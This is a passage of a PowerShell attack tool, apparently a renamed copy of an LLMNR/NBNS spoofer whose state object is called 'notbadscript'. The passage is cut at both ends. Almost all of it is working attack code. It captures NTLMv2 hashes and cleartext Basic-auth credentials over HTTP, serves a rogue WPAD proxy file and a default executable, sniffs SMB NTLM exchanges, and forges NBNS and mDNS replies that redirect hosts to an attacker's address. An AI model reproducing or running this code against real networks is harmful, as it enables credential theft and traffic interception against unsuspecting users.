                                $notbadscript.log_file_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP($HTTP_NTLM_host_string)")
                            }

                            if($notbadscript.log_output)
                            {
                                $notbadscript.log.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP($HTTP_NTLM_host_string)")
                            }

                            if(!$notbadscript.console_unique -or ($notbadscript.console_unique -and $notbadscript.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                            {
                                $notbadscript.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash")
                            }
                            else
                            {
                                $notbadscript.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string - not unique")
                            }

                            if($notbadscript.file_output -and (!$notbadscript.file_unique -or ($notbadscript.file_unique -and $notbadscript.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")))
                            {
                                $notbadscript.NTLMv2_file_queue.Add($HTTP_NTLM_hash)
                                $notbadscript.console_queue.Add("$HTTP_type NTLMv2 challenge/response written to " + $notbadscript.NTLMv2_out_file)
                            }

                            if($notbadscript.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")
                            {
                                $notbadscript.NTLMv2_username_list.Add("$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")
                            }

                        }

                    }

                    if ($notbadscript.IP_capture_list -notcontains $HTTP_source_IP -and -not $HTTP_NTLM_user_string.EndsWith('$') -and !$notbadscript.spoofer_repeat -and $HTTP_source_IP -ne $IP)
                    {
                        $notbadscript.IP_capture_list.Add($HTTP_source_IP)
                    }

                    $HTTP_response_status_code = 0x32,0x30,0x30
                    $HTTP_response_phrase = 0x4f,0x4b
                    $HTTP_client_close = $true
                    $NTLM_challenge = ""

                    if($proxy_listener)
                    {

                        if($HTTPResponse -or $HTTPDir)
                        {
                            $HTTP_header_cache_control = 0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x6e,0x6f,0x2d,0x63,0x61,0x63,0x68,0x65,0x2c,0x20,0x6e,0x6f,0x2d,0x73,0x74,0x6f,0x72,0x65
                        }
                        else
                        {
                            $HTTP_send = $false
                        }

                    }

                }
                else
                {
                    $HTTP_client_close = $true
                }

            }
            elseif($HTTP_header_authorization.startswith('Basic '))
            {
                $HTTP_response_status_code = 0x32,0x30,0x30
                $HTTP_response_phrase = 0x4f,0x4b
                $HTTP_header_authorization = $HTTP_header_authorization -replace 'Basic ',''
                $cleartext_credentials = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($HTTP_header_authorization))
                $HTTP_client_close = $true
                $notbadscript.cleartext_file_queue.Add($cleartext_credentials)
                $notbadscript.cleartext_list.Add($cleartext_credentials)
                $notbadscript.console_queue.Add("$(Get-Date -format 's') - $HTTP_type Basic auth cleartext credentials $cleartext_credentials captured from $HTTP_source_IP")

                if($notbadscript.file_output)
                {
                    $notbadscript.console_queue.Add("$HTTP_type Basic auth cleartext credentials written to " + $notbadscript.cleartext_out_file)
                    $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - Basic auth cleartext credentials captured from $HTTP_source_IP")
                }

                if($notbadscript.log_output)
                {
                    $notbadscript.log.Add("$(Get-Date -format 's') - Basic auth cleartext credentials captured from $HTTP_source_IP")
                }

            }

            if(($HTTP_request_raw_url -notmatch '/wpad.dat' -and $HTTPAuth -eq 'Anonymous') -or ($HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous') -or (
            $WPADAuthIgnore.Count -gt 0 -and $WPADAuth -like 'NTLM*' -and ($WPADAuthIgnore | Where-Object {$HTTP_header_user_agent -match $_})) -or $HTTP_client_close)
            {

                if($HTTPDir -and $HTTPDefaultEXE -and $HTTP_request_raw_url -like '*.exe' -and (Test-Path (Join-Path $HTTPDir $HTTPDefaultEXE)) -and !(Test-Path (Join-Path $HTTPDir $HTTP_request_raw_url)))
                {
                    [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $HTTPDefaultEXE))
                    $HTTP_header_content_type = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 + [System.Text.Encoding]::UTF8.GetBytes("application/exe")
                }
                elseif($HTTPDir)
                {

                    if($HTTPDefaultFile -and !(Test-Path (Join-Path $HTTPDir $HTTP_request_raw_url)) -and (Test-Path (Join-Path $HTTPDir $HTTPDefaultFile)) -and $HTTP_request_raw_url -notmatch '/wpad.dat')
                    {
                        [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $HTTPDefaultFile))
                    }
                    elseif(($HTTPDefaultFile -and $HTTP_request_raw_url -eq '' -or $HTTPDefaultFile -and $HTTP_request_raw_url -eq '/') -and (Test-Path (Join-Path $HTTPDir $HTTPDefaultFile)))
                    {
                        [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $HTTPDefaultFile))
                    }
                    elseif($WPADResponse -and $HTTP_request_raw_url -match '/wpad.dat')
                    {
                        [Byte[]]$HTTP_message_bytes = [System.Text.Encoding]::UTF8.GetBytes($WPADResponse)
                        $HTTP_header_content_type = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 + [System.Text.Encoding]::UTF8.GetBytes("application/x-ns-proxy-autoconfig")
                    }
                    else
                    {

                        if(Test-Path (Join-Path $HTTPDir $HTTP_request_raw_url))
                        {
                            [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDir $HTTP_request_raw_url))
                        }
                        else
                        {
                            [Byte[]]$HTTP_message_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTPResponse)
                        }

                    }

                }
                else
                {

                    if($WPADResponse -and $HTTP_request_raw_url -match '/wpad.dat' -and (!$ProxyIgnore -or !($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_})))
                    {
                        $HTTP_message = $WPADResponse
                        $HTTP_header_content_type = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 + [System.Text.Encoding]::UTF8.GetBytes("application/x-ns-proxy-autoconfig")
                    }
                    elseif($HTTPResponse)
                    {
                        $HTTP_message = $HTTPResponse

                        if($HTTPContentType)
                        {
                            $HTTP_header_content_type = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 + [System.Text.Encoding]::UTF8.GetBytes($HTTPContentType)
                        }

                    }

                    [Byte[]]$HTTP_message_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)
                }

            }
            else
            {
                [Byte[]]$HTTP_message_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)
            }

            $HTTP_timestamp = Get-Date -format r
            $HTTP_timestamp = [System.Text.Encoding]::UTF8.GetBytes($HTTP_timestamp)
            $HTTP_header_content_length = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20 + [System.Text.Encoding]::UTF8.GetBytes($HTTP_message_bytes.Length)

            if(($HTTPAuth -like 'NTLM*' -and $HTTP_request_raw_URL -notmatch '/wpad.dat') -or ($WPADAuth -like 'NTLM*' -and $HTTP_request_raw_URL -match '/wpad.dat') -and !$HTTP_client_close)
            {
                $HTTP_header_authenticate_data = [System.Text.Encoding]::UTF8.GetBytes($NTLM)
            }
            elseif(($HTTPAuth -eq 'Basic' -and $HTTP_request_raw_URL -notmatch '/wpad.dat') -or ($WPADAuth -eq 'Basic' -and $HTTP_request_raw_URL -match '/wpad.dat'))
            {
                $HTTP_header_authenticate_data = [System.Text.Encoding]::UTF8.GetBytes("Basic realm=$HTTPBasicRealm")
            }

            $packet_HTTPResponse = New-Object System.Collections.Specialized.OrderedDictionary
            $packet_HTTPResponse.Add("HTTPResponse_RequestVersion",[Byte[]](0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20))
            $packet_HTTPResponse.Add("HTTPResponse_StatusCode",$HTTP_response_status_code + [Byte[]](0x20))
            $packet_HTTPResponse.Add("HTTPResponse_ResponsePhrase",$HTTP_response_phrase + [Byte[]](0x0d,0x0a))
            $packet_HTTPResponse.Add("HTTPResponse_Server",[Byte[]](0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a))
            $packet_HTTPResponse.Add("HTTPResponse_TimeStamp",[Byte[]](0x44,0x61,0x74,0x65,0x3a,0x20) + $HTTP_timestamp + [Byte[]](0x0d,0x0a))
            $packet_HTTPResponse.Add("HTTPResponse_ContentLength",$HTTP_header_content_length + [Byte[]](0x0d,0x0a))

            if($HTTP_header_authenticate -and $HTTP_header_authenticate_data)
            {
                $packet_HTTPResponse.Add("HTTPResponse_AuthenticateHeader",$HTTP_header_authenticate + $HTTP_header_authenticate_data + [Byte[]](0x0d,0x0a))
            }

            if($HTTP_header_content_type)
            {
                $packet_HTTPResponse.Add("HTTPResponse_ContentType",$HTTP_header_content_type + [Byte[]](0x0d,0x0a))
            }

            if($HTTP_header_cache_control)
            {
                $packet_HTTPResponse.Add("HTTPResponse_CacheControl",$HTTP_header_cache_control + [Byte[]](0x0d,0x0a))
            }

            if($HTTP_send)
            {
                $packet_HTTPResponse.Add("HTTPResponse_Message",[Byte[]](0x0d,0x0a) + $HTTP_message_bytes)
                $HTTP_response = ConvertFrom-PacketOrderedDictionary $packet_HTTPResponse
                $HTTP_stream.Write($HTTP_response,0,$HTTP_response.Length)
                $HTTP_stream.Flush()
            }

            Start-Sleep -m 10
            $HTTP_request_raw_URL_old = $HTTP_request_raw_URL
            $HTTP_client_handle_old = $HTTP_client.Client.Handle

            if($HTTP_client_close)
            {
                $HTTP_reset_delay = $false

                if($proxy_listener)
                {
                    $HTTP_client.Client.Close()
                }
                else
                {
                    $HTTP_client.Close()
                }

            }

        }
        else
        {

            if($HTTP_data_available -or !$HTTP_reset_delay -or $HTTP_reset_delay_stopwatch.Elapsed -ge $HTTP_reset_delay_timeout)
            {
                $HTTP_client.Close()
                $HTTP_client_close = $true
                $HTTP_reset_delay = $false
            }
            else
            {
                Start-Sleep -m 100
            }

        }

    }

    $HTTP_client.Close()
    start-sleep -s 1
    $HTTP_listener.Server.Blocking = $false
    Start-Sleep -s 1
    $HTTP_listener.Server.Close()
    Start-Sleep -s 1
    $HTTP_listener.Stop()
}

# Sniffer/Spoofer ScriptBlock - LLMNR/NBNS Spoofer and SMB sniffer
$sniffer_scriptblock =
{
    param ($IP,$LLMNR,$LLMNR_response_message,$LLMNRTTL,$mDNS,$mDNS_response_message,$mDNSTypes,$mDNSTTL,$NBNS,$NBNS_response_message,$NBNSTypes,$NBNSTTL,$SMB,$SpooferHostsIgnore,$SpooferHostsReply,$SpooferIP,$SpooferIPsIgnore,$SpooferIPsReply,
            $SpooferLearning,$SpooferLearningDelay,$SpooferLearningInterval)

    $sniffer_running = $true
    $byte_in = New-Object System.Byte[] 4
    $byte_out = New-Object System.Byte[] 4
    $byte_data = New-Object System.Byte[] 4096
    $byte_in[0] = 1
    $byte_in[1-3] = 0
    $byte_out[0] = 1
    $byte_out[1-3] = 0
    $sniffer_socket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
    $sniffer_socket.SetSocketOption("IP","HeaderIncluded",$true)
    $sniffer_socket.ReceiveBufferSize = 4096

    try
    {
        $end_point = New-Object System.Net.IPEndpoint([System.Net.IPAddress]"$IP",0)
    }
    catch
    {
        $notbadscript.console_queue.Add("$(Get-Date -format 's') - Error starting sniffer/spoofer")
        $sniffer_running = $false

        if($notbadscript.file_output)
        {
            $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - Error starting sniffer/spoofer")
        }

        if($notbadscript.log_output)
        {
            $notbadscript.log.Add("$(Get-Date -format 's') - Error starting sniffer/spoofer")
        }

    }

    $sniffer_socket.Bind($end_point)
    $sniffer_socket.IOControl([System.Net.Sockets.IOControlCode]::ReceiveAll,$byte_in,$byte_out)
    $LLMNR_TTL_bytes = [System.BitConverter]::GetBytes($LLMNRTTL)
    [Array]::Reverse($LLMNR_TTL_bytes)
    $mDNS_TTL_bytes = [System.BitConverter]::GetBytes($mDNSTTL)
    [Array]::Reverse($mDNS_TTL_bytes)
    $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)
    [Array]::Reverse($NBNS_TTL_bytes)
    $LLMNR_learning_log = New-Object System.Collections.Generic.List[string]
    $NBNS_learning_log = New-Object System.Collections.Generic.List[string]

    if($SpooferLearningDelay)
    {
        $spoofer_learning_delay = New-TimeSpan -Minutes $SpooferLearningDelay
        $spoofer_learning_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    }

    while($notbadscript.running -and $sniffer_running)
    {
        $packet_data = $sniffer_socket.Receive($byte_data,0,$byte_data.Length,[System.Net.Sockets.SocketFlags]::None)
        $memory_stream = New-Object System.IO.MemoryStream($byte_data,0,$packet_data)
        $binary_reader = New-Object System.IO.BinaryReader($memory_stream)
        $version_HL = $binary_reader.ReadByte()
        $binary_reader.ReadByte() > $null
        $total_length = DataToUInt16 $binary_reader.ReadBytes(2)
        $binary_reader.ReadBytes(5) > $null
        $protocol_number = $binary_reader.ReadByte()
        $binary_reader.ReadBytes(2) > $null
        $source_IP_bytes = $binary_reader.ReadBytes(4)
        $source_IP = [System.Net.IPAddress]$source_IP_bytes
        $destination_IP_bytes = $binary_reader.ReadBytes(4)
        $destination_IP = [System.Net.IPAddress]$destination_IP_bytes
        $header_length = [Int]"0x$(('{0:X}' -f $version_HL)[1])" * 4

        switch($protocol_number)
        {

            6
            {  # TCP
                $source_port = DataToUInt16 $binary_reader.ReadBytes(2)
                $destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
                $binary_reader.ReadBytes(8) > $null
                $TCP_header_length = [Int]"0x$(('{0:X}' -f $binary_reader.ReadByte())[0])" * 4
                $binary_reader.ReadBytes(7) > $null
                $payload_bytes = $binary_reader.ReadBytes($total_length - ($header_length + $TCP_header_length))

                switch ($destination_port)
                {

                    139
                    {
                        if($SMB -eq 'Y')
                        {

                            if($NTLM_challenge -and $client_IP -eq $source_IP -and $client_port -eq $source_port)
                            {
                                SMBNTLMResponse $payload_bytes
                            }

                            $client_IP = ""
                            $client_port = ""
                            $NTLM_challenge = ""

                        }
                    }

                    445
                    {

                        if($SMB -eq 'Y')
                        {

                            if($NTLM_challenge -and $client_IP -eq $source_IP -and $client_port -eq $source_port)
                            {
                                SMBNTLMResponse $payload_bytes
                            }

                            $client_IP = ""
                            $client_port = ""
                            $NTLM_challenge = ""

                        }

                    }

                }

                # Outgoing packets
                switch ($source_port)
                {

                    139
                    {

                        if($SMB -eq 'Y')
                        {
                            $client_IP = $destination_IP
                            $client_port = $destination_port
                            $NTLM_challenge = SMBNTLMChallenge $payload_bytes
                        }

                    }

                    445
                    {

                        if($SMB -eq 'Y')
                        {
                            $client_IP = $destination_IP
                            $client_port = $destination_port
                            $NTLM_challenge = SMBNTLMChallenge $payload_bytes
                        }

                    }

                }

            }

            17
            {  # UDP
                $source_port = $binary_reader.ReadBytes(2)
                $endpoint_source_port = DataToUInt16 ($source_port)
                $destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
                $UDP_length = $binary_reader.ReadBytes(2)
                $UDP_length_uint  = DataToUInt16 ($UDP_length)
                $binary_reader.ReadBytes(2) > $null
                $payload_bytes = $binary_reader.ReadBytes(($UDP_length_uint - 2) * 4)

                # Incoming packets
                switch($destination_port)
                {

                    137 # NBNS
                    {

                        if(([System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00' -or [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-00-00-01') -and [System.BitConverter]::ToString($payload_bytes[10..11]) -ne '00-01')
                        {
                            $UDP_length[0] += 12

                            $NBNS_response_data = $payload_bytes[13..$payload_bytes.Length] +
                                                    $NBNS_TTL_bytes +
                                                    0x00,0x06,0x00,0x00 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()

                            $NBNS_response_packet = 0x00,0x89 +
                                                    $source_port[1,0] +
                                                    $UDP_length[1,0] +
                                                    0x00,0x00 +
                                                    $payload_bytes[0,1] +
                                                    0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                                    $NBNS_response_data

                            $NBNS_query_type = [System.BitConverter]::ToString($payload_bytes[43..44])

                            switch ($NBNS_query_type)
                            {

                                '41-41'
                                {
                                    $NBNS_query_type = '00'
                                }

                                '41-44'
                                {
                                    $NBNS_query_type = '03'
                                }

                                '43-41'
                                {
                                    $NBNS_query_type = '20'
                                }

                                '42-4C'
                                {
                                    $NBNS_query_type = '1B'
                                }

                                '42-4D'
                                {
                                    $NBNS_query_type = '1C'
                                }

                                '42-4E'
                                {
                                    $NBNS_query_type = '1D'
                                }

                                '42-4F'
                                {
                                    $NBNS_query_type = '1E'
                                }

                            }

                            $NBNS_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes.Length - 4)])
                            $NBNS_query = $NBNS_query -replace "-00",""
                            $NBNS_query = $NBNS_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
                            $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
                            $NBNS_query_string_subtracted = ""
                            $NBNS_query_string = ""
                            $n = 0

                            do
                            {
                                $NBNS_query_string_sub = (([Byte][Char]($NBNS_query_string_encoded.Substring($n,1))) - 65)
                                $NBNS_query_string_subtracted += ([System.Convert]::ToString($NBNS_query_string_sub,16))
                                $n += 1
                            }
                            until($n -gt ($NBNS_query_string_encoded.Length - 1))

                            $n = 0

                            do
                            {
                                $NBNS_query_string += ([Char]([System.Convert]::ToInt16($NBNS_query_string_subtracted.Substring($n,2),16)))
                                $n += 2
                            }
                            until($n -gt ($NBNS_query_string_subtracted.Length - 1) -or $NBNS_query_string.Length -eq 15)

                            $NBNS_request_ignore = $false

                            if($NBNS -eq 'Y')
                            {

                                if($SpooferLearning -eq 'Y' -and $notbadscript.valid_host_list -notcontains $NBNS_query_string -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00' -and $source_IP -ne $IP)
                                {

                                    if(($NBNS_learning_log.Exists({param($s) $s -like "20* $NBNS_query_string"})))
                                    {
                                        $NBNS_learning_queue_time = [DateTime]$NBNS_learning_log.Find({param($s) $s -like "20* $NBNS_query_string"}).SubString(0,19)

                                        if((Get-Date) -ge $NBNS_learning_queue_time.AddMinutes($SpooferLearningInterval))
                                        {
                                            $NBNS_learning_log.RemoveAt($NBNS_learning_log.FindIndex({param($s) $s -like "20* $NBNS_query_string"}))
                                            $NBNS_learning_send = $true
                                        }
                                        else
                                        {
                                            $NBNS_learning_send = $false
                                        }

                                    }
                                    else
                                    {
                                        $NBNS_learning_send = $true
                                    }

                                    if($NBNS_learning_send)
                                    {
                                        $NBNS_transaction_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
                                        $NBNS_transaction_ID_bytes = $NBNS_transaction_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                        $NBNS_transaction_ID = $NBNS_transaction_ID -replace " ","-"
                                        $NBNS_UDP_client = new-Object System.Net.Sockets.UdpClient 137
                                        $NBNS_hostname_bytes = $payload_bytes[13..($payload_bytes.Length - 5)]

                                        $NBNS_request_packet = $NBNS_transaction_ID_bytes +
                                                                0x01,0x10,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x20 +
                                                                $NBNS_hostname_bytes +
                                                                0x00,0x20,0x00,0x01

                                        $NBNS_learning_destination_endpoint = New-Object System.Net.IPEndpoint([IPAddress]::broadcast,137)
                                        $NBNS_UDP_client.Connect($NBNS_learning_destination_endpoint)
                                        $NBNS_UDP_client.Send($NBNS_request_packet,$NBNS_request_packet.Length)
                                        $NBNS_UDP_client.Close()
                                        $NBNS_learning_log.Add("$(Get-Date -format 's') $NBNS_transaction_ID $NBNS_query_string")
                                        $notbadscript.console_queue.Add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string sent to " + $NBNS_learning_destination_endpoint.Address.IPAddressToString)

                                        if($notbadscript.file_output)
                                        {
                                            $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - LLMNR request for $NBNS_query_string sent to " + $NBNS_learning_destination_endpoint.Address.IPAddressToString)
                                        }

                                        if($notbadscript.log_output)
                                        {
                                            $notbadscript.log.Add("$(Get-Date -format 's') - LLMNR request for $NBNS_query_string sent to " + $NBNS_learning_destination_endpoint.Address.IPAddressToString)
                                        }

                                    }

                                }

                                if(($notbadscript.valid_host_list -notcontains $NBNS_query_string -or $SpooferHostsReply -contains $NBNS_query_string) -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $NBNS_query_string) -and (
                                !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $NBNS_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (
                                !$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and ($notbadscript.spoofer_repeat -or $notbadscript.IP_capture_list -notcontains $source_IP.IPAddressToString) -and ($NBNS_query_string.Trim() -ne '*') -and (
                                $SpooferLearning -eq 'N' -or ($SpooferLearning -eq 'Y' -and !$SpooferLearningDelay) -or ($SpooferLearningDelay -and $spoofer_learning_stopwatch.Elapsed -ge $spoofer_learning_delay)) -and ($source_IP -ne $IP) -and (
                                $NBNSTypes -contains $NBNS_query_type))
                                {

                                    if($SpooferLearning -eq 'N' -or !$NBNS_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                                    {
                                        $NBNS_send_socket = New-Object Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                                        $NBNS_send_socket.SendBufferSize = 1024
                                        $NBNS_destination_point = New-Object Net.IPEndpoint($source_IP,$endpoint_source_port)
                                        $NBNS_send_socket.SendTo($NBNS_response_packet,$NBNS_destination_point)
                                        $NBNS_send_socket.Close()
                                        $NBNS_response_message = "- response sent"
                                    }
                                    else
                                    {
                                        $NBNS_request_ignore = $true
                                    }

                                }
                                else
                                {

                                    if($source_IP -eq $IP -and $NBNS_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                                    {
                                        $NBNS_request_ignore = $true
                                    }
                                    elseif($NBNSTypes -notcontains $NBNS_query_type)
                                    {
                                        $NBNS_response_message = "- disabled NBNS type"
                                    }
                                    elseif($SpooferHostsReply -and $SpooferHostsReply -notcontains $NBNS_query_string)
                                    {
                                        $NBNS_response_message = "- $NBNS_query_string is not on reply list"
                                    }
                                    elseif($SpooferHostsIgnore -and $SpooferHostsIgnore -contains $NBNS_query_string)
                                    {
                                        $NBNS_response_message = "- $NBNS_query_string is on ignore list"
                                    }
                                    elseif($SpooferIPsReply -and $SpooferIPsReply -notcontains $source_IP)
                                    {
                                        $NBNS_response_message = "- $source_IP is not on reply list"
                                    }
                                    elseif($SpooferIPsIgnore -and $SpooferIPsIgnore -contains $source_IP)
                                    {
                                        $NBNS_response_message = "- $source_IP is on ignore list"
                                    }
                                    elseif($NBNS_query_string.Trim() -eq '*')
                                    {
                                        $NBNS_response_message = "- NBSTAT request"
                                    }
                                    elseif($notbadscript.valid_host_list -contains $NBNS_query_string)
                                    {
                                        $NBNS_response_message = "- $NBNS_query_string is a valid host"
                                    }
                                    elseif($notbadscript.IP_capture_list -contains $source_IP.IPAddressToString)
                                    {
                                        $NBNS_response_message = "- previous capture from $source_IP"
                                    }
                                    elseif($SpooferLearningDelay -and $spoofer_learning_stopwatch.Elapsed -lt $spoofer_learning_delay)
                                    {
                                        $NBNS_response_message = "- " + [Int]($SpooferLearningDelay - $spoofer_learning_stopwatch.Elapsed.TotalMinutes) + " minute(s) until spoofing starts"
                                    }
                                    elseif($source_IP -eq $IP -and !$NBNS_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                                    {
                                        $NBNS_response_message = "- local request"
                                    }
                                    else
                                    {
                                        $NBNS_response_message = "- something went wrong"
                                    }

                                }

                            }

                            if(!$NBNS_request_ignore -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00')
                            {
                                $notbadscript.console_queue.Add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")

                                if($notbadscript.file_output)
                                {
                                    $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")
                                }

                                if($notbadscript.log_output)
                                {
                                    $notbadscript.log.Add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")
                                }

                            }
                            elseif($SpooferLearning -eq 'Y' -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-00-00-01' -and $NBNS_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                            {
                                [Byte[]]$NBNS_response_IP_bytes = $payload_bytes[($payload_bytes.Length - 4)..($payload_bytes.Length)]
                                $NBNS_response_IP = [System.Net.IPAddress]$NBNS_response_IP_bytes
                                $NBNS_response_IP = $NBNS_response_IP.IPAddressToString

                                if($notbadscript.valid_host_list -notcontains $NBNS_query_string)
                                {
                                    $notbadscript.valid_host_list.Add($NBNS_query_string)
                                    $notbadscript.console_queue.Add("$(Get-Date -format 's') - NBNS response $NBNS_response_IP for $NBNS_query_string received from $source_IP - $NBNS_query_string added to valid host list")

                                    if($notbadscript.file_output)
                                    {
                                        $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - NBNS response $NBNS_response_IP for $NBNS_query_string received from $source_IP - $NBNS_query_string added to valid host list")
                                    }

                                    if($notbadscript.log_output)
                                    {
                                        $notbadscript.log.Add("$(Get-Date -format 's') - NBNS response $NBNS_response_IP for $NBNS_query_string received from $source_IP - $NBNS_query_string added to valid host list")
                                    }

                                }

                            }

                        }

                    }

                    5353 # mDNS
                    {

                        if([System.BitConverter]::ToString($payload_bytes) -like '*-00-01-80-01')
                        {
                            $UDP_length[0] += 10
                            $mDNS_query_payload_bytes = $payload_bytes[(12)..($payload_bytes.Length - 5)]
                            $mDNS_query_string = DataToString 1 $mDNS_query_payload_bytes[0] $mDNS_query_payload_bytes
                            $mDNS_query_string_full = $mDNS_query_string + ".local"

                            $mDNS_response_data = $mDNS_query_payload_bytes +
                                                    0x00,0x01,0x00,0x01 +
                                                    $mDNS_TTL_bytes +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()

                            $mDNS_response_packet = 0x14,0xe9 +
                                                    $source_port[1,0] +
                                                    $UDP_length[1,0] +
                                                    0x00,0x00 +
                                                    $payload_bytes[0,1] +
                                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    $mDNS_response_data

                            if($mDNS -eq 'Y')
                            {

                                if((!$SpooferHostsReply -or $SpooferHostsReply -contains $mDNS_query_string) -and (!$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $mDNS_query_string) -and (
                                !$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and (
                                $notbadscript.spoofer_repeat -or $notbadscript.IP_capture_list -notcontains $source_IP.IPAddressToString) -and ($mDNSTypes -contains 'QU'))
                                {
                                    $send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp )
                                    $send_socket.SendBufferSize = 1024
                                    $destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port)
                                    $send_socket.SendTo($mDNS_response_packet,$destination_point)
                                    $send_socket.Close()
                                    $mDNS_response_message = "- response sent"
                                }
                                else
                                {

                                    if($mDNSTypes -notcontains 'QU')
                                    {
                                        $mDNS_response_message = "- disabled mDNS type"
                                    }
                                    elseif($SpooferHostsReply -and $SpooferHostsReply -notcontains $mDNS_query_string)
                                    {
                                        $mDNS_response_message = "- $mDNS_query_string is not on reply list"
                                    }
                                    elseif($SpooferHostsIgnore -and $SpooferHostsIgnore -contains $mDNS_query_string)
                                    {
